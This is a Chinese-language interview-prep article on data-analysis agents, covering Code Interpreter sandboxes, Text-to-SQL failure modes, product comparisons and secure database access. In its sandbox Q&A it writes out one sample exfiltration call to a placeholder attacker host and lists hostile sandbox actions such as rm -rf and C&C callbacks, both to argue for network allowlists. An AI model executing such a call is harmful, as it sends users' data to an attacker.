---
title: 数据分析 Agent
description: ChatGPT Data Analyst、Claude Code Interpreter、Julius AI、Hex Magic——把"会 Python 的数据科学家"塞进对话框。本文拆解 Code Interpreter 模式的核心架构（沙箱执行 + 文件持久化 + 中间结果反馈）、Text-to-SQL 的失败模式、为什么"自己写代码跑"比"调统计工具"更通用，以及数据分析 Agent 在企业级 BI 场景的落地路径。
pageClass: vertical-data-analysis-page
---

<section class="doc-hero">
  <p class="doc-hero__kicker">垂直 Agent</p>
  <h1>数据分析 Agent</h1>
  <p class="doc-hero__lead">2023 年 7 月 ChatGPT 推出 Code Interpreter（后改名 Advanced Data Analysis），让"用 LLM 做数据分析"从概念变成产品。这一类 Agent 的特殊之处在于——它不是"调一堆数据工具"，而是"自己写 Python 代码、在沙箱里跑、看结果决定下一步"。本文讲清楚这种 Code Interpreter 范式为什么比 Text-to-SQL 通用，企业级数据分析 Agent 怎么对接真实仓库，以及它和 BI 工具（Tableau/PowerBI）的边界。</p>
  <div class="doc-hero__meta" aria-label="本文信息">
    <span>适合阶段：进阶 / 数据团队</span>
    <span>核心链路：Understand → Code → Execute → Visualize → Iterate</span>
    <span>面试重点：Code Interpreter 沙箱 + Text-to-SQL 局限 + 数据安全边界</span>
  </div>
</section>

> **本文边界**：聚焦数据分析 Agent 的核心范式（Code Interpreter）和企业落地。沙箱执行的安全见 [工具沙箱与权限](../tools/sandbox)；编程 Agent 的通用模式见 [编程 Agent](./coding-agent)；RAG 检索见 [RAG 章节](../rag/)。

## 面试官想考什么

读完这篇你要能正面回答下面这些题。每题后面括号里是面试官真正想看你答出什么。

<div class="interview-grid">
  <div>
    <strong>数据分析 Agent 的核心范式是 Code Interpreter，为什么不是 Text-to-SQL？</strong>
    <span>考范式差异——Text-to-SQL 只能查数据库且语义贫弱；Code Interpreter 能做清洗、统计、建模、可视化全流程，且能跨多种数据源。</span>
  </div>
  <div>
    <strong>Code Interpreter 在沙箱里跑代码，沙箱怎么设计？为什么必须沙箱？</strong>
    <span>考安全意识——LLM 可能生成危险代码（rm、网络请求、读敏感文件），沙箱用 Docker / WASM 隔离 + 资源限制 + 网络白名单。</span>
  </div>
  <div>
    <strong>Code Interpreter 的中间结果（图表、表格）怎么反馈给 LLM？纯文本就够吗？</strong>
    <span>考多模态反馈——表格转成 markdown 喂给 LLM、图表渲染成图片用 vision model 看、错误消息原样回传。</span>
  </div>
  <div>
    <strong>Text-to-SQL 在生产里成功率多少？最常见的失败模式是什么？</strong>
    <span>考真实瓶颈——SOTA 在 Spider 上 ~85%，BIRD 上 ~70%，但真实企业仓库通常 < 50%，主要卡在 schema 复杂、隐式业务语义、多表 join。</span>
  </div>
  <div>
    <strong>数据分析 Agent 怎么对接企业内部的 PostgreSQL/Snowflake/BigQuery？直接给数据库密码？</strong>
    <span>考安全架构——绝对不能给数据库直连，要走中间层（API、view、row-level security），加查询审计 + 限速。</span>
  </div>
  <div>
    <strong>数据分析 Agent 和 BI 工具（Tableau / PowerBI / Looker）什么关系？替代还是补充？</strong>
    <span>考产品定位——BI 工具是"做 dashboard 给所有人看"，Agent 是"做 ad-hoc 一次性分析"，互补不替代。</span>
  </div>
  <div>
    <strong>数据分析 Agent 的"幻觉"最危险——它可能编出看似合理但错的数字。怎么防？</strong>
    <span>考数据可信度保障——强制让 Agent 引用数据查询的 raw output、用户必须能看到生成的代码、关键数字加来源标注。</span>
  </div>
  <div>
    <strong>企业落地数据分析 Agent，最大的非技术障碍是什么？</strong>
    <span>考产品 + 组织判断——不是技术问题，是数据治理（schema 文档化、metric 定义对齐）和组织信任（业务方接受 AI 给的数字）。</span>
  </div>
</div>

---

## 为什么 Code Interpreter 是统治性范式

回到 2023 年——OpenAI 第一次让 ChatGPT 能跑代码时，市场有过短暂的疑惑："为什么不是让 LLM 调 Text-to-SQL、调 Pandas API、调可视化库这些专用工具？"

答案在用一段真实需求体现：

```
用户："这个 CSV 文件里有 3 年的销售数据。
       帮我看看：
       1. 哪个产品类别毛利最高？
       2. 季节性趋势怎样？
       3. 给我画个图比较各类别的同比增长率。"
```

如果用专用工具的方案，要实现：
- 数据加载工具（识别 CSV/Excel/JSON 等格式）
- SQL 查询工具（先把 CSV 加载到内存数据库）
- 聚合工具（按类别 group by + 算毛利）
- 时序工具（按季度切分 + 趋势分析）
- 可视化工具（生成柱状图）
- 同比计算工具（per 类别 per 季度 同比）

——你需要为"数据分析所有可能的操作"预先定义工具集，**而且每个工具都有自己的输入输出格式**。LLM 在多个工具之间拼接时容易出错。

Code Interpreter 的方案：

```python
# Agent 写的代码（在沙箱里跑）
import pandas as pd

df = pd.read_csv('/uploaded/sales.csv')
df['quarter'] = pd.to_datetime(df['date']).dt.to_period('Q')

# 类别毛利
gp = df.groupby('category').apply(lambda x: (x['revenue'] - x['cost']).sum() / x['revenue'].sum())
print("类别毛利率：", gp.sort_values(ascending=False))

# 季度趋势
trend = df.groupby(['category', 'quarter'])['revenue'].sum().unstack(0)
trend.plot(kind='line', figsize=(10, 6), title='季度营收趋势')
plt.savefig('/output/trend.png')

# 同比增长率
yoy = trend.pct_change(periods=4) * 100
yoy.plot(kind='bar', figsize=(10, 6), title='同比增长率')
plt.savefig('/output/yoy.png')
```

**为什么 Code Interpreter 更通用？**

**(1) Python + 数据库 + 库生态 = 几乎无限的能力**

Pandas、NumPy、SciPy、Scikit-learn、Statsmodels、Matplotlib、Plotly——加起来覆盖了数据科学的几乎所有需求。LLM 写代码调这些库，比定义"数据科学 100 工具"更通用。

**(2) 自由组合中间步骤**

数据分析的特点是"看到中间结果决定下一步"。`describe()` 看到方差大 → 决定查 outlier；看到缺失值 → 决定 imputation 策略。这种动态决策用代码自由组合最自然——预定义工具的"输入 → 输出"链条做不到。

**(3) 可解释 + 可复用**

Agent 生成的代码用户能看、能改、能复制走单独跑。用户不喜欢分析结果时可以直接改代码而不是改 prompt 反复重试。

**(4) 多源数据**

CSV、SQL、JSON、Parquet、API——Python 读什么都行。Text-to-SQL 只能查 SQL 数据库。

Code Interpreter 范式的统治性在所有数据分析 Agent 产品里都能看到——ChatGPT Advanced Data Analysis、Claude（带 code execution）、Julius AI、Hex Magic、Mode AI、Snowflake Cortex Analyst……架构都一样。

---

## 核心架构：Code Interpreter 的内部结构

```mermaid
flowchart TB
    User["用户：'分析这份销售数据'"] --> Loop

    subgraph Loop["主循环"]
      LLM["LLM<br/>(写 Python 代码)"]
      Sandbox["Sandbox<br/>(Docker/Firecracker/WASM)"]
      Files["文件系统<br/>(/uploads, /output)"]
      Display["渲染层<br/>(表格 + 图片 + 错误)"]
    end

    User -->|上传 CSV| Files
    LLM -->|生成代码| Sandbox
    Sandbox -->|stdout| Display
    Sandbox -->|图片| Display
    Sandbox -->|exception| Display
    Display -->|文本反馈| LLM
    Display -->|图片反馈| LLM
    LLM -->|继续| Sandbox
```

逐层拆解。

### 沙箱执行环境

数据分析 Agent 必须有沙箱——给 LLM 一个隔离的 Python 环境跑代码。三个核心需求：

**(1) 状态持久**

```
turn 1: df = pd.read_csv('sales.csv')
turn 2: df.head()    # 用得到上一轮的 df
turn 3: df.groupby('cat').sum()
```

每次代码执行不是独立进程——是同一个 Python 进程的不同 cell（Jupyter kernel 模式）。这要求沙箱是 long-lived 的。

**(2) 资源限制**

- CPU 上限（防止"误算"跑死）
- 内存上限（处理大文件时可能 OOM）
- 磁盘上限（防止生成超大输出）
- 执行超时（卡死的代码强制 kill）
- 网络限制（默认禁止外联，特殊场景白名单）

**(3) 隔离强度**

不同实现方式：

| 实现 | 隔离强度 | 启动速度 | 主流产品 |
|---|---|---|---|
| Docker container | 中（共享 kernel） | 100ms-1s | ChatGPT Code Interpreter（2023 早期） |
| Firecracker MicroVM | 高（独立 kernel） | ~125ms | OpenAI 后期、AWS Lambda |
| WASM | 中（受 WASM runtime 限制） | <50ms | Pyodide-based（浏览器内 Python） |
| gVisor | 中（用户态 kernel） | 几百 ms | Google Cloud Run |
| 远程 Jupyter kernel | 取决于部署 | 看场景 | Anthropic Claude Code Interpreter |

主流商业产品（ChatGPT、Claude）用 Firecracker 或自研 MicroVM——每个用户/session 独立 VM，安全和速度的平衡点。

### 文件系统约定

Code Interpreter 通常约定两个目录：

```
/uploads/      # 用户上传的文件
/output/        # Agent 输出的文件（图、报告、清洗后数据）
```

用户上传 CSV → 自动放到 `/uploads/sales.csv`。Agent 把图存到 `/output/chart.png` → 系统自动检测 + 渲染给用户。

文件持久性：

- **Session 内**：所有文件持久，跨多轮对话保留
- **Session 之间**：Session 结束销毁（隐私 + 安全）
- **少数产品**有"持久 workspace"（如 Hex），文件跨 session 保留

### 中间结果反馈机制

这是 Code Interpreter 比纯 Text-to-SQL 强的关键——**中间结果以多种格式喂回 LLM**：

```python
# Agent 执行了：
df.describe()

# 沙箱输出（stdout）：
        revenue   cost
count   1000.00 1000.00
mean    5234.21 3211.45
std     1234.56  876.32
...

# 反馈给 LLM 的格式：
[Tool Result]
Standard Output:
        revenue   cost
count   1000.00 1000.00
mean    5234.21 3211.45
...

# Agent 接着写：
# "我注意到 std/mean 比值很大，说明数据离散度高，先看 distribution..."
df['revenue'].hist(bins=50)
plt.savefig('/output/revenue_dist.png')

# 沙箱输出（图片）：
# 自动检测 /output/revenue_dist.png 生成
# 反馈给 LLM：
[Tool Result] 
<image of revenue distribution histogram>

# Agent 看图：
# "分布双峰，说明数据可能有两个 segment, 我用聚类分一下..."
```

注意 Agent 是**真的看到了图片**——这需要 vision-capable model（GPT-4V、Claude 3.5+、Gemini）。早期 Code Interpreter（2023 年 GPT-4，无视觉）只能看 stdout、看不懂图，那时数据分析 Agent 的能力有上限。视觉模型加入后这块能力质变。

---

## Text-to-SQL：为什么它没成为统治性范式

虽然 Code Interpreter 是主流，但 Text-to-SQL 这个想法仍很有吸引力——很多企业的核心数据就在 SQL 仓库里。讨论一下它的现状和局限。

**学术 benchmark 进展**：

| Benchmark | SOTA Accuracy（2024-2025） |
|---|---|
| Spider（结构化、单 schema） | 85%+ |
| BIRD（复杂、跨多表） | ~70% |
| Spider 2.0（企业真实场景） | ~30% |

注意分数从 Spider（学术）到 Spider 2.0（企业真实）暴跌——这是 Text-to-SQL 真正的生产能力。

**真实企业的失败模式**：

**失败 1：Schema 太复杂**

```
学术 benchmark 的 schema：~5-10 张表，列名清晰（user_id, order_date, total）
企业真实 schema：500+ 张表，列名是 dim_cust_pty_tier_3_v2, fact_trxn_ds_id_h
                历史包袱让命名混乱，新人都看不懂
```

LLM 看 prompt 里 500 张表的 schema 直接懵——上下文塞不下，硬塞了也无法准确选表。

**失败 2：隐式业务语义**

```
用户问："上季度的活跃用户数量"
"活跃" 的定义？
  - 公司 A：登录过即活跃
  - 公司 B：完成核心动作（购买/分享）才算
  - 公司 C：按 RFM 模型打分≥X
  
Text-to-SQL 不知道这家公司的"活跃"是哪个定义
```

业务术语的隐式定义是 Text-to-SQL 在生产中最大的卡点。Cube.dev、dbt 这类"semantic layer"工具的兴起就是为了解决这事——把业务语义显式建模，让 SQL 生成有依据。

**失败 3：多表 join 路径选错**

```
"客户的累计订单金额" 
有 3 张可能的表：
  - fact_orders（包含订单）  
  - dim_customer（包含 LTV 字段，但更新滞后）
  - mart_customer_lifetime（专门的聚合表，最快但有 1 天延迟）
  
哪张表？取决于"用户能容忍多旧的数据"、"性能要求"——
这是工程判断不是 SQL 题
```

**失败 4：数据质量陷阱**

```
SQL 跑出来 customers 表有 100 万行
但 customers 里有 30% 是测试数据
但 customers 还有重复（同一邮箱多次注册）
但 customers 的 deleted 字段是 1 的应该排除
  
专业的数据分析师会自然处理这些
Text-to-SQL 不知道这些隐式 filter
```

**结论**：Text-to-SQL 在生产里仍然是"半个工具"——给个 SQL 草稿让人改，比"直接给最终答案"更现实。专业产品（Snowflake Cortex、AWS Q in QuickSight）的做法是：Text-to-SQL 生成 → 显示给用户 → 用户审/改 → 执行。把"信任"放在用户手里，不让 AI 独立决策。

Code Interpreter + Text-to-SQL 的最佳组合是：

```
用户问业务问题
  ↓
Agent 用 Text-to-SQL 生成 SQL 草稿
  ↓
Code Interpreter 跑 SQL（不是直接执行，先在沙箱跑）
  ↓
拿到数据后用 Pandas 做后处理 + 可视化
  ↓
关键数字回 Agent 让它解读
```

这就是 Snowflake Cortex Analyst、Hex Magic 等"企业级"数据分析 Agent 的实际架构。

---

## 主流产品对比

| 产品 | 定位 | 数据源 | 沙箱 | 独家能力 |
|---|---|---|---|---|
| **ChatGPT Advanced Data Analysis** | 通用数据分析 | 用户上传文件 | OpenAI 自研 MicroVM | 集成 GPT-4V/o1 |
| **Claude (with code execution)** | 通用数据分析 | 用户上传文件 | Anthropic 沙箱 | 长 context（200k） |
| **Julius AI** | 数据科学 + ML | 文件上传 + 数据库连接 | 自建 | 内置 ML 模型训练 |
| **Hex Magic** | 数据团队协作 BI | Snowflake/BQ/Postgres 等 | Hex 平台 | 集成 SQL + Python + dashboard |
| **Mode AI** | BI 增强 | Mode 平台连接的源 | Mode 平台 | 与 Mode dashboard 深度集成 |
| **Snowflake Cortex Analyst** | 企业 Text-to-SQL | Snowflake 内部 | Snowflake 计算 | 利用 Snowflake schema + metric |
| **AWS Q in QuickSight** | 企业 BI 自然语言 | QuickSight 数据源 | AWS 平台 | 与 AWS 生态深度集成 |

**几个判断维度**：

**(1) 通用 vs 企业级**

ChatGPT/Claude 走通用路线——你上传任何 CSV 都能分析，但接不到企业数据仓库。
Hex/Mode/Cortex/Q 走企业路线——能接你公司的数据库，但需要 IT 部署 + 数据治理。

**(2) 自助 vs 协作**

ChatGPT 是单人自助分析——你问、AI 答。
Hex 是团队协作平台——分析师做的 notebook 能 share 给业务方、能定时跑、能嵌入 dashboard。

**(3) 模型新鲜度**

ChatGPT/Claude 永远用最新模型（GPT-5、Claude Opus 4.7 之类）。
企业平台（Cortex / Q）通常用稍旧但更稳定的模型——企业看重稳定性大于先进性。

---

## 自建数据分析 Agent 的工程要点

如果你要自建数据分析 Agent（比如做内部工具），关键工程问题：

### 安全：数据库连接的边界

**绝对不能**直接给 Agent 数据库密码：

```python
# ❌ 危险写法
agent.tools = [SQLTool(conn_string="postgresql://admin:pwd@prod-db:5432/main")]
# Agent 可以 DROP TABLE、可以读所有 row、可以无限并发查询
```

**正确架构**：

```
Agent
  ↓ (调用受限 API)
应用中间层
  ↓ (验证 + 限速 + 审计)
只读 view / Row-Level Security 限定的 connection
  ↓
数据库
```

具体措施：

- **只读连接 + 只读 user**：连接字符串用专门的只读账户
- **Row-Level Security**：Postgres / Snowflake 的 RLS 让 Agent 只能看到允许的行
- **预定义的 view**：把"业务对象"暴露为 view，Agent 看不到底层表
- **查询审计**：每条 SQL 记录 + 用户 ID + 时间戳
- **限速**：单 Agent 每秒最多 N 次查询、每分钟最多消耗 M MB

### 沙箱：开源方案

不想用 OpenAI/Anthropic 的托管沙箱时，主流开源选择：

- **E2B**（[github.com/e2b-dev/e2b](https://github.com/e2b-dev/e2b)）—— 为 LLM Agent 设计的 Code Interpreter 沙箱，Firecracker 后端，API 友好
- **Daytona** —— Hermes Agent 也在用，serverless persistence
- **Modal Sandbox** —— Modal 平台的代码执行
- **Pyodide** —— 浏览器内跑 Python，最轻但生态有限
- **Docker + 自己包装** —— DIY 路线

### 文件 IO 的工程化

用户上传大文件（CSV 几 GB）时：

- 不要一次性加载到 LLM context（CSV 整文件喂模型会爆 token）
- 让 Agent 先做 `head()`、`describe()`、`info()` 看 schema 和样本
- 大文件用 chunk 读取 + 增量分析
- 输出文件大于阈值时上传到对象存储（S3/GCS），不直接通过 messages 传

### 引用与可信度

Code Interpreter 类 Agent 的"幻觉"特别危险——它可能编出看似合理的数字。缓解：

```python
# 强制 Agent 在每个数字结论后展示数据出处
system_prompt = """When stating any numeric finding, ALWAYS:
1. Show the code that produced it (not just the result)
2. Show the raw output of that code
3. Only THEN interpret the number

Example:
✓ "Revenue grew 23%. (Computed by `df.groupby('year')['revenue'].sum().pct_change()`, output: 2023→2024 = 0.234)"
✗ "Revenue grew 23%."
"""
```

这种"强制溯源"是数据分析 Agent 的核心可信度机制。

---

## 容易踩的坑

**坑 1：上传文件超过 context 限制**

- **现象**：用户上传 500MB CSV，Agent 直接报错或 crash
- **根因**：Agent 试图把文件内容塞进 prompt
- **修法**：Agent 永远先 `read_csv` 加载到沙箱、再用 `head()`/`info()` 看 schema。Agent 看到的是元数据不是原文

**坑 2：图表"看起来对"但读错数据**

- **现象**：Agent 画了个柱状图说"产品 A 销量最高"，但其实 group_by 时把空值处理错了
- **根因**：Agent 没检查数据质量就画图
- **修法**：system prompt 要求 Agent 画图前必须先检查 missing values、duplicates、outliers，并在结论中注明数据质量限制

**坑 3：Agent 安装恶意 package**

- **现象**：Agent 执行 `pip install xxx`，xxx 是恶意 package
- **根因**：沙箱允许 pip install
- **修法**：
  - 沙箱网络白名单（只允许 pypi.org）
  - pip install 加 hash 检查
  - 严格场景下完全禁止 pip install，预装常用库（pandas、numpy、matplotlib、scikit-learn 等）

**坑 4：长 session 状态混乱**

- **现象**：Agent 在 30 轮对话后引用了一个早已被 delete 的 dataframe
- **根因**：context 压缩时丢了"哪个变量在哪个 cell 被定义"的信息
- **修法**：定期让 Agent 跑 `dir()` 或 `%whos` 重新理解当前 namespace 状态

**坑 5：可视化风格随机**

- **现象**：同一个用户的多次分析报告，图表风格完全不一致（颜色、字体、布局）
- **根因**：默认 matplotlib 风格变化，Agent 没设置统一 theme
- **修法**：system prompt 里指定 `plt.style.use('seaborn-v0_8')`、统一 figsize、统一字号

**坑 6：业务术语理解错**

- **现象**：用户问"上季度 DAU 趋势"，Agent 用 "distinct user count" 算了，但公司的 DAU 定义包含特定动作
- **根因**：Agent 不知道公司内的 metric 定义
- **修法**：在 system prompt 或 RAG 中加 metric 字典（DAU = ..., MAU = ..., Active = ...），Agent 用业务术语前必须查字典

**坑 7：执行超时杀死长查询**

- **现象**：在仓库上跑个大 query 超过沙箱超时，整个分析中断
- **根因**：沙箱默认超时（如 60 秒）对大数据集太短
- **修法**：让用户能调超时、或者让 Agent 先 `LIMIT 1000` 试跑、确认正确再去 full scan

---

## 面试题深度解析

**Q1: 数据分析 Agent 的核心范式是 Code Interpreter 而不是 Text-to-SQL，为什么？**

- **30 秒版本**：通用性差异。Text-to-SQL 只能查 SQL 数据库 + 语义贫弱（聚合简单/复杂分析不行）+ 不能可视化。Code Interpreter 写 Python，覆盖加载→清洗→统计→建模→可视化的全流程，且能跨多种数据源（CSV/SQL/API）。再加上数据分析本质是"看到中间结果决定下一步"的迭代过程，自由代码比预定义工具更适应这种动态。所有主流数据分析 Agent 产品（ChatGPT/Claude/Julius/Hex）都用 Code Interpreter 范式。
- **追问：那 Text-to-SQL 完全没用了吗？** 不是。Text-to-SQL 在企业场景仍有重要角色——当数据全在 SQL 仓库 + 业务方就想要个简单聚合时，Text-to-SQL 比 Code Interpreter 轻。最佳组合是 Text-to-SQL 生成 SQL 草稿，Code Interpreter 跑这个 SQL 然后做后处理。这是 Snowflake Cortex、Hex Magic 的实际做法。
- **追问：未来 Code Interpreter 会不会进化成"数据 Agent 框架"？** 已经在发生。Hex Magic、Mode AI 之类的产品就是把 Code Interpreter + SQL + 协作 + 可视化 + 调度 整合成完整平台。单纯的"对话框 + 代码执行"会被这些更完整的产品蚕食。

**Q2: Code Interpreter 沙箱怎么设计？为什么必须沙箱？**

- **30 秒版本**：LLM 可能生成危险代码（rm -rf、读敏感文件、外联 C&C 服务器、加密用户文件勒索）——任何 Agent 写代码的场景都必须沙箱。设计：(1) 隔离层用 Docker/Firecracker/gVisor，(2) 资源限制（CPU/内存/磁盘/超时），(3) 网络白名单（默认禁止外联），(4) 文件系统约定（`/uploads`、`/output`），(5) 状态持久（Jupyter kernel 模式）。
- **追问：Docker container 够安全吗？** 对大多数场景够。但 container 共享 kernel——如果有 kernel exploit，container 隔离可能被打破。安全要求最高的场景（处理敏感金融/医疗数据），用 Firecracker MicroVM（每个 VM 有独立 kernel）或 gVisor（用户态 kernel）。OpenAI/Anthropic 的托管 Code Interpreter 都用 MicroVM 级别。
- **追问：网络白名单为什么重要？** 没有的话 Agent 写的代码可以 `requests.get('http://attacker.com', data=exfiltrate)` 把用户数据发出去。即使 Agent 没"主动作恶"，prompt injection 也可能让它这么干。白名单只允许 `pypi.org`、内部 API 等可信源，外联其他地方一律拒绝。

**Q3: Text-to-SQL 在企业里的真实成功率有多高？**

- **30 秒版本**：学术 benchmark（Spider）SOTA 85%，但企业真实场景（Spider 2.0、内部测试）通常 < 50%。差距来源：(1) 真实 schema 复杂得多（500+ 表 vs 学术 5-10 表），(2) 隐式业务语义（"活跃"、"DAU"的公司特定定义），(3) 多表 join 路径选择（同样数据有几张表，选哪张取决于性能/新鲜度 trade-off），(4) 数据质量陷阱（测试数据、重复、软删除）。
- **追问：怎么让企业 Text-to-SQL 真正可用？** 三个关键：(1) Semantic Layer（dbt、Cube 这类工具显式建模业务术语），(2) 限定查询范围（只暴露 view 而非原始表），(3) 把 Text-to-SQL 当辅助而非自主——生成 SQL 草稿，让人审改后再执行。完全无人值守的 Text-to-SQL 在企业里不可行。
- **追问：LLM 能力提升能不能解决这个？** 部分能。GPT-5 / Claude Opus 4.7 这类大模型在 schema 理解和歧义消解上明显比早期模型强。但"隐式业务语义"是个根本挑战——LLM 不可能凭空知道你公司"DAU"的定义。这部分必须有 Semantic Layer 作为外部知识。

**Q4: 数据分析 Agent 的幻觉特别危险，怎么防？**

- **30 秒版本**：核心机制是"强制溯源"——Agent 给出任何数字结论前，必须展示生成这个数字的代码 + raw output。用户能审、能验、能复现。技术上通过 system prompt 强约束 + 输出格式 schema 检查 + 用户界面强制展示代码区。这不是杜绝幻觉，是让幻觉可被验证。
- **追问：用户真的会去验吗？** 大多数不会——这是真实痛点。所以专业产品在 UX 上做了优化：默认显示"AI 用了这段代码 → 跑出这个表 → 得出这个结论"的三段式，让用户**至少瞥一眼**就能发现明显异常。一些产品（Julius、Hex）会自动跑"sanity check"——比如 group_by 后总和是否等于原总和，发现异常自动提醒。
- **追问：完全可信的数据分析 Agent 什么时候能有？** 短期没有。即使强制溯源，Agent 可能"代码写对但解读错"——比如计算了 mean 然后说"中位数"。完全可信需要 Agent 能自我验证（写测试代码验证主代码、cross-check 多种方法）。这是研究前沿（self-verification），实际产品还没到。当前阶段数据分析 Agent 的定位是"高效率的草稿生成器"，最终决策必须人审。

---

## 延伸阅读

- **OpenAI Advanced Data Analysis 介绍** [openai.com/index/code-interpreter](https://openai.com/blog/chatgpt-plugins#code-interpreter) — 最早的 Code Interpreter 产品，2023 年的发布奠定了范式
- **E2B 开源沙箱** [e2b.dev](https://e2b.dev) — 为 LLM Agent 设计的 Code Interpreter 沙箱，自建首选
- **BIRD Benchmark** [bird-bench.github.io](https://bird-bench.github.io/) — Text-to-SQL 复杂场景的权威 benchmark，看真实分数
- **Spider 2.0** [spider2-sql.github.io](https://spider2-sql.github.io/) — 企业级 Text-to-SQL benchmark，2024 年新出，分数比 Spider 暴跌反映真实难度
- **Snowflake Cortex Analyst** [snowflake.com/cortex-analyst](https://docs.snowflake.com/en/user-guide/snowflake-cortex/cortex-analyst) — 企业级 Text-to-SQL 实战案例，看 Snowflake 怎么解决 schema 复杂问题
- **dbt Semantic Layer** [docs.getdbt.com/docs/use-dbt-semantic-layer](https://docs.getdbt.com/docs/use-dbt-semantic-layer) — Semantic Layer 是 Text-to-SQL 可生产化的关键基础设施
- **本站 [工具沙箱与权限](../tools/sandbox)** — Code Interpreter 沙箱的安全设计前置
- **本站 [编程 Agent](./coding-agent)** — Code Interpreter 本质是个特化的编程 Agent，通用模式可参考
- **本站 [RAG 基础](../rag/basics)** — Semantic Layer 类似 RAG 的检索层，是数据分析 Agent 的知识源
